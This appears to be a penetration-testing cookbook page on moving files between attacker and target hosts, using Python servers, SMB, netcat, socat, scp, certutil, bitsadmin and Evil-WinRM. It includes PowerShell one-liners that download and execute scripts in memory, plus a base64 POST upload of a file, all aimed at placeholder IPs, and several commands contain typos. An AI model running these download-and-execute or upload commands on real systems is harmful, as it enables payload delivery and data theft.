---
layout: default
title: Moving Files Around
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

Ports `80` and `443` are a good starting point.

## Local web server
```
// Python 2
python -m SimpleHTTPServer

// Python3
python3 -m http.server
python3 -m http.server <port>
python3 -m http.server --bind 172.x.x.x 443
python3 -m http.server --bind 172.x.x.x --directory tools/ 443
```

See [this link](https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html) for creating a `http.server` that accepts `PUT` requests. Use with something like:

```
curl -X PUT -T file-to-upload http://<IP>:<port>/
```


## Local FTP server
```
// Python 3
python3 -m pyftpdlib
python3 -m pyftpdlib --interface=172.x.x.x -p4433
python3 -m pyftpdlib --interface=172.x.x.x -p4433 -username=user --password='pass' --directory=tools/ --verbSMB server
```

## Local SMB server
```
Main issue is trying to bind Windows to a non-standard port number. Running on the standard port requires sudo which is a pain.
// Sudo required for access to lower port.
sudo impacket-smbserver -username user -password pass -smb2support Shared tools/

// Sudo not required for higher port, this proves troublesome for Windows though.
impacket-smbserver -username user -password pass -port 4343 -smb2support Shared tools/
```

## Netcat
Note there are multiple implementations of Netcat: netcat, ncat and nc to name a few.

```
// On sender.
nc -q0 10.x.x.x 4343 < file.in
compress -c file.in | nc -q0 10.x.x.x 4343

// On receiver.
nc -lp 4343 > file.out
nc -lp 4343 | uncompress > file.out
```

## Socat
```
// On sender.
socat -u FILE:file.in TCP:10.x.x.x:4343

// On receiver.
socat -u TCP-LISTEN:4343 OPEN:file.out,creat,trunc
```

## Secure Copy
Assumes ssh access.

```
// Copy file from target to local folder.
scp user@10.x.x.x:file.in /local/folder/

// Copy directory from target to local folder.
scp -r user@10.x.x.x:/remote/folder /local/folder/

// Copy local file to remote target.
scp file.local user@10.x.x.x;/remote/folder/

// Copy local folder to remote target.
scp -r /local/folder/ user@10.x.x.x /local/folder/

// Copy remote file to remote target.
scp from-user@10.x.x.x:/source/folder/ to-user@10.y.y.y:/dest/folder/ 
```

## PowerShell
### DownloadString
```
// Download and execute in memory using Invoke-Expression (IEX).
IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x:80/resource.ps1')

// Download and execute in memory using IEX.
(New-Object Net.WebClient).DownloadString('http://10.x.x.x:80/resource.ps1') | IEX
```

### DownloadFile
```
// Download and save file locally.
(New-Object Net.WebClient).DownloadFile('http://10.x.x.x:80/resource.ps1', "C:\Users\Public\Downloads\resource.ps1")
```

### Invoke-WebRequest
```
// Download.
Invoke-WebRequest http://10.x.x.x:80/resource.ps1 -OutFile resource.ps1

// Download and execute in memory.
Invoke-WebRequest http://10.x.x.x:00/resource.ps1 | IEX

// Download, ignore IE not having been run errors
Invoke-WebRequest http://10.x.x.x:80/resource.ps1 -UseBasicParsing | IEX

// Upload to POST enabled HTTP server.
$data = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\Downloads\dir.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://10.x.x.x:80 -Method POST -Body $data
```

## Windows certutil.exe
```
// Windows wget equivalent.
certutil -urlcache -f http://10.x.x.x:port/file.ext outfile.exe
```

## Windows BITS
```
// Download resource from web server or SMB share.
bitsadmin /transfer n http://10.x.x.x:443/file.exe C:\Users\Public\Downloads\file.exe
```

## Evil-WinRM
```
// Upload local file to remote.
*Evil-WinRM* PS C:\> Upload local.file remote.file

// Download remote file to local.
*Evil-WinRM* PS C:\> Download remote.file local.file
```

## Misc
If you have a shell, conver them to `base64` and copy/paste between windows.

